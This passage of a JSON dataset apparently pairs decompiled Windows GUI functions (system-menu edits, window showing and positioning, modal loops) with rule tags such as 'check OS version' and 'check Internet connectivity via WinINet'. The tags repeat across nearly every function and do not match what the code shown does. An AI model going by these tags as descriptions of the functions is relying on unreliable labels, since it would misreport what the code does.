        "decompiled_code": "\nvoid __cdecl fcn.0045d594(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (((*(*(arg_8h + -4) + 0x271) != '\\0') && ((*(*(arg_8h + -4) + 0x270) & 1) != 0)) &&\n       (*(*(arg_8h + -4) + 0x277) != '\\x01')) {\n        uVar1 = fcn.0044d1c8(0);\n        uVar1 = sub.user32.dll_GetSystemMenu(uVar1);\n        if (*(*(arg_8h + -4) + 0x271) == '\\x03') {\n            sub.user32.dll_DeleteMenu(uVar1, 0xf130, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 7, 0x400);\n            sub.user32.dll_DeleteMenu(uVar1, 5, 0x400);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf030, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf020, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf000, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf120, 0);\n        }\n        else {\n            if ((*(*(arg_8h + -4) + 0x270) & 2) == 0) {\n                sub.user32.dll_EnableMenuItem(uVar1, 0xf020, 1);\n            }\n            if ((*(*(arg_8h + -4) + 0x270) & 4) == 0) {\n                sub.user32.dll_EnableMenuItem(uVar1, 0xf030, 1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 398
    },
    "0045d958": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045d958(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x45d9f3;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x290) != 0) {\n        iVar2 = 0;\n        if ((*(param_2 + 6) != -1) || (puVar1 = &stack0xfffffffc,  *(param_2 + 4) != 0)) {\n            puVar1 = &stack0xfffffffc;\n            if ((*(param_2 + 6) & 0x10) != 0) {\n                in_stack_ffffffd8 = *(param_2 + 8);\n                sub.user32.dll_GetSubMenu(in_stack_ffffffd8, *(param_2 + 4));\n                puVar1 = puStack24;\n            }\n            puStack24 = puVar1;\n            iVar2 = fcn.0043d848();\n            puVar1 = puStack24;\n        }\n        puStack24 = puVar1;\n        if (iVar2 == 0) {\n            fcn.00463044();\n            puVar1 = puStack24;\n        }\n        else {\n            fcn.00442288();\n            fcn.00463044();\n            puVar1 = puStack24;\n        }\n    }\n    puStack24 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffd8;\n    uStack32 = 0x45d9fa;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 443
    },
    "0045dcd4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0045dcd4(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0;\n    if ((*(in_EAX + 0x158) == '\\x01') && (*(in_EAX + 0x160) != 0)) {\n        uVar1 = 1;\n    }\n    else if ((*(in_EAX + 0x158) == '\\0') && (*(in_EAX + 0x15c) != 0)) {\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 132
    },
    "0045dd0c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045dd0c(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_ECX;\n    uchar *in_EDX;\n    \n    if (*(in_EAX + 0x158) == '\\x01') {\n        *in_EDX = 1;\n        *in_ECX = *(in_EAX + 0x160);\n    }\n    else {\n        *in_EDX = 0;\n        fcn.00404df4();\n    }\n    return;\n}\n",
        "token_count": 114
    },
    "0045dd40": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0045dd40(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_34h;\n    uint var_29h;\n    uint var_25h;\n    uint var_21h;\n    uint var_1dh;\n    uint var_19h;\n    uint var_15h;\n    uint var_11h;\n    uint var_dh;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack72 = 0x45deaa;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    var_4h = param_2;\n    if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n        if (*(*(param_2 + 8) + 4) == 1) {\n            puStack68 = &stack0xfffffffc;\n            for (iVar2 = fcn.00441fd4(); iVar2 != 0; iVar2 = *(iVar2 + 0x30)) {\n                cVar1 = fcn.0045dcd4();\n                if (cVar1 != '\\0') break;\n            }\n            if (iVar2 == 0) goto code_r0x0045de94;\n            fcn.0045dd0c(&fcn.0045dd40::var_8h);\n            fcn.00413a6c();\n            fcn.0044502c();\n        }\n        else {\n            var_dh._0_1_ = '\\x01';\n            iVar2 = fcn.0045dc94(&stack0xfffffffc);\n            if (iVar2 == 0) {\n                fcn.0045dc94(&stack0xfffffffc);\n            }\n            fcn.00413a6c();\n            fcn.0044502c();\n        }\n        if (((*(in_EAX + 0x270) & 8) == 0) || (var_dh != '\\x01')) {\n            if (var_dh == '\\x01') {\n                fcn.00462c68();\n            }\n            else if (var_dh == '\\0') {\n                fcn.00462bd8();\n            }\n        }\n        else {\n            fcn.00462cf0();\n            fcn.00462cf0();\n        }\n    }\ncode_r0x0045de94:\n    *in_FS_OFFSET = uStack76;\n    puStack68 = 0x45deb1;\n    uStack72 = 0x45dea9;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 646
    },
    "0045df58": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045df58(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uchar *arg_8h;\n    uchar *arg_8h_00;\n    uint var_24h;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    arg_8h_00 = &stack0xfffffffc;\n    if ((((*(in_EAX + 0x348) != '\\0') && ((*(in_EAX + 0x30) == 0 || ((*(in_EAX + 0x1c) & 0x10) == 0)))) &&\n        ((*(*(param_2 + 8) + 8) != 0 || (*(*(param_2 + 8) + 0xc) != 0)))) &&\n       ((*(*(param_2 + 8) + 0x10) == *(in_EAX + 0x48) && (*(*(param_2 + 8) + 0x14) == *(in_EAX + 0x4c))))) {\n        fcn.0045b858();\n        fcn.0045f980();\n        fcn.0045b858();\n        fcn.0045f980();\n        fcn.0045df2c(arg_8h);\n        fcn.0045b858();\n        fcn.0045f980();\n        fcn.0045df2c(arg_8h_00);\n        fcn.0045df2c(&stack0xfffffffc);\n        fcn.0045df2c(&stack0xfffffffc);\n    }\n    fcn.0044b5c4();\n    return;\n}\n",
        "token_count": 405
    },
    "0045e174": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0045e174(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t *in_FS_OFFSET;\n    uint32_t uStack60;\n    int32_t iStack56;\n    uchar *puStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack52 = &stack0xfffffffc;\n    uStack32 = 0x45e77f;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puVar1 = &stack0xfffffffc;\n    if (((*(in_EAX + 7) & 0x10) == 0) && (puVar1 = &stack0xfffffffc,  (*(in_EAX + 0xd6) & 4) != 0)) {\n        puStack40 = 0x45e1b5;\n        fcn.00406a50();\n        puStack40 = 0x45e1c4;\n        fcn.0040c5ac();\n        puStack40 = 0x45e1c9;\n        fcn.004047cc();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    puStack40 = 0x45e1d3;\n    fcn.00463134();\n    *(in_EAX + 0xd6) = *(in_EAX + 0xd6) | 4;\n    uStack44 = 0x45e762;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    if ((*(in_EAX + 7) & 0x10) == 0) {\n        if (*(in_EAX + 0x1da) == '\\0') {\n            iStack56 = 0x45e633;\n            uStack60 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffc4;\n            puStack40 = &stack0xfffffffc;\n            fcn.00404154();\n            *in_FS_OFFSET = uStack60;\n            if (*(*0x496588 + 0x6c) == in_EAX) {\n                puStack52 = 0x45e661;\n                fcn.0045d150();\n            }\n            if (*(in_EAX + 0x277) == '\\x01') {\n                puStack52 = 0x45e678;\n                (**(*in_EAX + 0xb0))();\n            }\n            else if ((*(in_EAX + 0xd6) & 8) == 0) {\n                iVar7 = 0;\n                puStack52 = 0x45e6b5;\n                iVar3 = fcn.0044d1c8();\n                puStack52 = 0x45e6bc;\n                iVar6 = sub.user32.dll_GetActiveWindow();\n                if (iVar3 == iVar6) {\n                    puStack52 = 0x45e6c8;\n                    puStack52 = fcn.0044d1c8();\n                    iStack56 = 0x45e6ce;\n                    iVar3 = sub.user32.dll_IsIconic();\n                    if (iVar3 == 0) {\n                        iStack56 = 0x45e6da;\n                        fcn.0044d1c8();\n                        iStack56 = 0x45e6df;\n                        iVar7 = fcn.00458164();\n                    }\n                }\n                if (iVar7 == 0) {\n                    puStack52 = NULL;\n                    iStack56 = 0x45e714;\n                    iStack56 = fcn.0044d1c8();\n                    uStack60 = 0x45e71a;\n                    sub.user32.dll_ShowWindow();\n                }\n                else {\n                    puStack52 = 0x97;\n                    iStack56 = 0;\n                    uStack60 = 0;\n                    uVar5 = fcn.0044d1c8(0, 0, 0);\n                    sub.user32.dll_SetWindowPos(uVar5);\n                    iStack56 = iVar7;\n                    sub.user32.dll_SetActiveWindow();\n                }\n            }\n            else {\n                puStack52 = 0x97;\n                iStack56 = 0;\n                uStack60 = 0;\n                uVar5 = fcn.0044d1c8(0, 0, 0);\n                sub.user32.dll_SetWindowPos(uVar5);\n            }\n        }\n        else {\n            iStack56 = 0x45e22c;\n            uStack60 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffc4;\n            puStack52 = &stack0xfffffffc;\n            puStack40 = &stack0xfffffffc;\n            fcn.00404154();\n            *in_FS_OFFSET = uStack60;\n            if ((*(in_EAX + 0x9e) == '\\x04') || ((*(in_EAX + 0x9e) == '\\x06' && (*(in_EAX + 0x277) == '\\x01')))) {\n                if (*(in_EAX + 0x277) == '\\x01') {\n                    puStack52 = 0x45e288;\n                    iVar3 = fcn.00444f18();\n                    iVar6 = iVar3 - in_EAX[0x12] >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((iVar3 - in_EAX[0x12] & 1U) != 0);\n                    }\n                    puStack52 = 0x45e2a4;\n                    iVar3 = fcn.00444f5c();\n                    iVar7 = iVar3 - in_EAX[0x13] >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((iVar3 - in_EAX[0x13] & 1U) != 0);\n                    }\n                }\n                else {\n                    puStack52 = 0x45e2bf;\n                    iVar3 = fcn.0045fc00();\n                    iVar6 = iVar3 - in_EAX[0x12] >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((iVar3 - in_EAX[0x12] & 1U) != 0);\n                    }\n                    puStack52 = 0x45e2d8;\n                    iVar3 = fcn.0045fbf4();\n                    iVar7 = iVar3 - in_EAX[0x13] >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((iVar3 - in_EAX[0x13] & 1U) != 0);\n                    }\n                }\n                puStack52 = 0x45e2f1;\n                iVar3 = fcn.0045fc18();\n                if (iVar6 < iVar3) {\n                    puStack52 = 0x45e2ff;\n                    fcn.0045fc18();\n                }\n                puStack52 = 0x45e30b;\n                iVar3 = fcn.0045fc0c();\n                if (iVar7 < iVar3) {\n                    puStack52 = 0x45e319;\n                    fcn.0045fc0c();\n                }\n                puStack52 = in_EAX[0x12];\n                iStack56 = in_EAX[0x13];\n                uStack60 = 0x45e338;\n                (**(*in_EAX + 0x88))();\n                if (*(in_EAX + 0x57) != '\\0') {\n                    puStack52 = 0x45e34d;\n                    fcn.0045c040();\n                }\n            }\n            else if (*(in_EAX + 0x9e) - 6U < 2) {\n                iVar3 = *(*0x496584 + 0x44);\n                if (*(in_EAX + 0x9e) == '\\a') {\n                    puStack52 = 0x45e38f;\n                    cVar2 = fcn.004040e4();\n                    if (cVar2 != '\\0') {\n                        iVar3 = in_EAX[1];\n                    }\n                }\n                if (iVar3 == 0) {\n                    puStack52 = 0x45e3df;\n                    iVar3 = fcn.0045fc00();\n                    iVar6 = iVar3 - in_EAX[0x12] >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((iVar3 - in_EAX[0x12] & 1U) != 0);\n                    }\n                    puStack52 = 0x45e3f8;\n                    iVar3 = fcn.0045fbf4();\n                    iVar7 = iVar3 - in_EAX[0x13] >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((iVar3 - in_EAX[0x13] & 1U) != 0);\n                    }\n                }\n                else {\n                    puStack52 = 0x45e3a4;\n                    iVar6 = fcn.0045a384();\n                    uVar4 = *(iVar3 + 0x48) - in_EAX[0x12];\n                    iVar7 = uVar4 >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((uVar4 & 1) != 0);\n                    }\n                    iVar6 = iVar6 + iVar7;\n                    puStack52 = 0x45e3bf;\n                    iVar7 = fcn.0045a3a4();\n                    uVar4 = *(iVar3 + 0x4c) - in_EAX[0x13];\n                    iVar3 = uVar4 >> 1;\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + ((uVar4 & 1) != 0);\n                    }\n                    iVar7 = iVar7 + iVar3;\n                }\n                puStack52 = 0x45e411;\n                iVar3 = fcn.0045fc18();\n                if (iVar6 < iVar3) {\n                    puStack52 = 0x45e41f;\n                    fcn.0045fc18();\n                }\n                puStack52 = 0x45e42b;\n                iVar3 = fcn.0045fc0c();\n                if (iVar7 < iVar3) {\n                    puStack52 = 0x45e439;\n                    fcn.0045fc0c();\n                }\n                puStack52 = in_EAX[0x12];\n                iStack56 = in_EAX[0x13];\n                uStack60 = 0x45e458;\n                (**(*in_EAX + 0x88))();\n                if (*(in_EAX + 0x57) != '\\0') {\n                    puStack52 = 0x45e46d;\n                    fcn.0045c040();\n                }\n            }\n            else if (*(in_EAX + 0x9e) == '\\x05') {\n                if (*(in_EAX + 0x277) == '\\x01') {\n                    puStack52 = 0x45e493;\n                    fcn.00444f18();\n                    puStack52 = 0x45e4af;\n                    fcn.00444f5c();\n                }\n                else {\n                    puStack52 = 0x45e4ca;\n                    fcn.0045fc30();\n                    puStack52 = 0x45e4e3;\n                    fcn.0045fc24();\n                }\n                puStack52 = in_EAX[0x12];\n                iStack56 = in_EAX[0x13];\n                uStack60 = 0x45e51b;\n                (**(*in_EAX + 0x88))();\n            }\n            *(in_EAX + 0x9e) = 0;\n            if (*(in_EAX + 0x277) == '\\x01') {\n                if (*(in_EAX + 0x273) == '\\x02') {\n                    puStack52 = NULL;\n                    iStack56 = 0x45e54b;\n                    iStack56 = fcn.0044d1c8();\n                    uStack60 = 0x223;\n                    sub.user32.dll_SendMessageA(*(*(*0x496584 + 0x44) + 0x29c));\n                    uVar5 = fcn.0044d1c8(3);\n                    sub.user32.dll_ShowWindow(uVar5);\n                }\n                else {\n                    puStack52 = *(*(in_EAX + 0x273) * 4 + 0x4917bc);\n                    iStack56 = 0x45e591;\n                    iStack56 = fcn.0044d1c8();\n                    uStack60 = 0x45e597;\n                    sub.user32.dll_ShowWindow();\n                    uStack60 = in_EAX[0x12] | in_EAX[0x13] << 0x10;\n                    uVar5 = fcn.0044d1c8(5, 0);\n                    sub.user32.dll_CallWindowProcA(0x407274, uVar5);\n                    fcn.0044580c();\n                }\n                iStack56 = *(*(*0x496584 + 0x44) + 0x29c);\n                sub.user32.dll_SendMessageA();\n            }\n            else {\n                puStack52 = *(*(in_EAX + 0x273) * 4 + 0x4917bc);\n                iStack56 = 0x45e604;\n                iStack56 = fcn.0044d1c8();\n                uStack60 = 0x45e60a;\n                sub.user32.dll_ShowWindow();\n            }\n        }\n    }\n    else if ((((*(in_EAX + 7) & 0x10) != 0) && (in_EAX[0xc] != 0)) && (*(in_EAX + 0x1da) != '\\0')) {\n        puStack52 = 0x1;\n        iStack56 = 0x45e744;\n        puStack40 = &stack0xfffffffc;\n        iStack56 = fcn.0044d1c8();\n        uStack60 = 0x45e74a;\n        sub.user32.dll_ShowWindow();\n    }\n    *in_FS_OFFSET = iStack56;\n    *(in_EAX + 0xd6) = *(in_EAX + 0xd6) & 0xfb;\n    return;\n}\n",
        "token_count": 3276
    },
    "0045e810": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045e810(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x59) != '\\0') {\n        if (*(param_2 + 4) == 0) {\n            puStack16 = 0x45e83c;\n            fcn.00420a44();\n            uStack20 = 0x45e86e;\n            uStack24 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe8;\n            puStack16 = &stack0xfffffffc;\n            (**(**(in_EAX + 0x68) + 8))();\n            *in_FS_OFFSET = uStack24;\n            puStack16 = 0x45e875;\n            uStack20 = 0x45e86d;\n            fcn.00403f58();\n            return;\n        }\n        puStack16 = 0x45e82e;\n        (**(**(in_EAX + 0x68) + 8))();\n    }\n    return;\n}\n",
        "token_count": 271
    },
    "0045e8a8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0045e8a8(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    char cStack12;\n    \n    if ((*(in_EAX + 0xd6) & 8) == 0) {\n        cVar1 = (**(*in_EAX + 0xf4))();\n        if (cVar1 != '\\0') {\n            if (*(in_EAX + 0x277) == '\\x01') {\n                if ((*(in_EAX + 0x9c) & 2) == 0) {\n                    cStack12 = '\\0';\n                }\n                else {\n                    cStack12 = '\\x03';\n                }\n            }\n            else {\n                cStack12 = '\\x01';\n            }\n            fcn.00404154();\n            if (cStack12 != '\\0') {\n                if (in_EAX == *(*0x496584 + 0x44)) {\n                    fcn.00462694();\n                }\n                else if (cStack12 == '\\x01') {\n                    fcn.0045ea48();\n                }\n                else if (cStack12 == '\\x03') {\n                    fcn.0045c000();\n                }\n                else {\n                    fcn.0045eb24();\n                }\n            }\n        }\n    }\n    else {\n        in_EAX[0xa5] = 2;\n    }\n    return;\n}\n",
        "token_count": 305
    },
    "0045ea68": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0045ea68(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x45eae7;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (*(in_EAX + 0x276) != '\\0') goto code_r0x0045ead1;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x57) == '\\0') {\ncode_r0x0045ea98:\n        puStack16 = puVar1;\n        if ((*(in_EAX + 7) & 0x10) != 0) {\n            cVar2 = fcn.0044d568();\n            if (cVar2 != '\\0') goto code_r0x0045eaca;\n        }\n        fcn.00406a50();\n        fcn.0040c5ac();\n        fcn.004047cc();\n    }\n    else {\n        cVar2 = (**(*in_EAX + 0x50))();\n        puVar1 = puStack16;\n        if (cVar2 == '\\0') goto code_r0x0045ea98;\n    }\ncode_r0x0045eaca:\n    fcn.0045d024();\ncode_r0x0045ead1:\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x45eaee;\n    uStack20 = 0x45eae6;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 399
    },
    "0045eb40": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0045eb40(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    uStack52 = 0x45ee32;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack60 = 0x45eb63;\n    fcn.00443aa0();\n    if (*(in_EAX + 0x57) == '\\0') {\n        puStack60 = 0x45eb74;\n        cVar1 = (**(*in_EAX + 0x50))();\n        if (((cVar1 != '\\0') && ((*(in_EAX + 0xd6) & 8) == 0)) && (*(in_EAX + 0x277) != '\\x01')) goto code_r0x0045ebb1;\n    }\n    puStack60 = 0x45eb9d;\n    fcn.00406a50();\n    puStack60 = 0x45ebac;\n    fcn.0040c5ac();\n    puStack60 = 0x45ebb1;\n    fcn.004047cc();\ncode_r0x0045ebb1:\n    puStack60 = 0x45ebb6;\n    iVar2 = sub.user32.dll_GetCapture();\n    if (iVar2 != 0) {\n        puStack60 = NULL;\n        uStack64 = 0;\n        uStack68 = 0x1f;\n        puStack72 = 0x45ebc5;\n        puStack72 = sub.user32.dll_GetCapture();\n        uStack76 = 0x45ebcb;\n        sub.user32.dll_SendMessageA();\n    }\n    puStack60 = 0x45ebd0;\n    sub.user32.dll_ReleaseCapture();\n    puStack60 = 0x45ebda;\n    fcn.004612d8();\n    uStack64 = 0x45ee15;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    *(in_EAX + 0xd6) = *(in_EAX + 0xd6) | 8;\n    puStack60 = &stack0xfffffffc;\n    if ((*(in_EAX + 0xcc) == '\\0') && (puStack60 = &stack0xfffffffc,  *(*0x496584 + 0xd4) != '\\0')) {\n        puStack72 = 0x45ec14;\n        puStack60 = &stack0xfffffffc;\n        fcn.00449ecc();\n        puStack72 = 0x45ec1c;\n        fcn.0044d1a4();\n    }\n    puStack72 = 0x45ec21;\n    sub.user32.dll_GetActiveWindow();\n    puStack72 = 0x45ec29;\n    fcn.00457f20();\n    puStack72 = 0x45ec43;\n    fcn.00414f68();\n    *(*0x496588 + 0x78) = in_EAX;\n    puStack72 = 0x45ec67;\n    fcn.0046016c();\n    puStack72 = 0x45ec79;\n    fcn.00458004();\n    uStack76 = 0x45edf3;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack84 = 0x45ec92;\n    puStack72 = &stack0xfffffffc;\n    fcn.0045ea50();\n    uStack88 = 0x45ed52;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    uVar3 = fcn.0044d1c8(0xb000, 0, 0);\n    sub.user32.dll_SendMessageA(uVar3);\n    in_EAX[0xa5] = 0;\n    do {\n        fcn.00462414();\n        if (*(*0x496584 + 0xa4) == '\\0') {\n            if (in_EAX[0xa5] != 0) {\n                fcn.0045e9b0();\n            }\n        }\n        else {\n            in_EAX[0xa5] = 2;\n        }\n    } while (in_EAX[0xa5] == 0);\n    uVar3 = fcn.0044d1c8(0xb001, 0, 0);\n    sub.user32.dll_SendMessageA();\n    fcn.0044d1c8();\n    sub.user32.dll_GetActiveWindow();\n    *in_FS_OFFSET = uVar3;\n    fcn.0045ea48(0x45ed59);\n    return;\n}\n",
        "token_count": 1200
    },
    "0045ee44": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045ee44(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1da) != '\\0') && (iVar2 = fcn.00449558(),  -1 < iVar2 + -1)) {\n        do {\n            piVar3 = fcn.0044951c();\n            if (((*(piVar3 + 0x51) & 0x80) != 0) && (*(piVar3 + 0x57) != '\\0')) {\n                (**(*piVar3 + 0x7c))();\n            }\n            cVar1 = fcn.004040e4();\n            if (cVar1 != '\\0') {\n                fcn.0045ee44(arg_8h);\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 233
    },
    "0045eeb4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0045eeb4(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    if (((*(in_EAX + 7) & 0x10) == 0) && (*(in_EAX + 0x1da) != '\\0')) {\n        (**(*in_EAX + 0x7c))();\n        if ((in_EAX[0xa4] != 0) && (iVar1 = fcn.0043c3c4(),  -1 < iVar1 + -1)) {\n            do {\n                piVar2 = fcn.0043c3d4();\n                if (*(piVar2 + 0x3e) != '\\0') {\n                    (**(*piVar2 + 0x40))();\n                }\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n        fcn.0045ee44(&stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 225
    },
    "0045ef8c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045ef8c(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1da) != '\\0') && (iVar2 = fcn.00449558(),  -1 < iVar2 + -1)) {\n        do {\n            iVar3 = fcn.0044951c();\n            if (((*(iVar3 + 0x57) != '\\0') && (cVar1 = fcn.0045ef5c(arg_8h),  cVar1 != '\\0')) ||\n               ((cVar1 = fcn.004040e4(),  cVar1 != '\\0' && (cVar1 = fcn.0045ef8c(arg_8h),  cVar1 != '\\0')))) {\n                return 1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 241
    },
